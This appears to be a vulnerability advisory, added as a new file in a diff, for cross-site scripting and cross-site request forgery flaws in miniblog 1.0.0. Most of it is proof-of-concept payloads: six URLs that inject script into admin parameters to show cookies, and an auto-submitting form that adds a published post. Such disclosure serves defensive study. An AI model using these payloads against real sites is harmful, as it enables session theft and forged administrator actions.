@@ -1,0 +1,32 @@
+source: http://www.securityfocus.com/bid/48281/info
+
+miniblog is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker can exploit these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.
+
+miniblog 1.0.0 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/adm/list.php?post_list=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+http://www.example.com/adm/login.php?error_text=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+http://www.example.com/adm/options.php?response_text=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+http://www.example.com/adm/password.php?response_text=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+http://www.example.com/adm/edit.php?response_text=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/adm/edit.php?mode=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+
+<form action="http://www.example.com/adm/admin.php?mode=add&id=" method="post">
+<input type="hidden" name="data[post_title]" value="csrf">
+<input type="hidden" name="data[post_content]" value="csrf">
+<input type="hidden" name="data[published]" value="1">
+<input type="hidden" name="miniblog_PostBack" value="Add">
+<input type="submit" id="btn">
+</form>
+<script>
+document.getElementById(&#039;btn&#039;).click();
+</script>
+
+
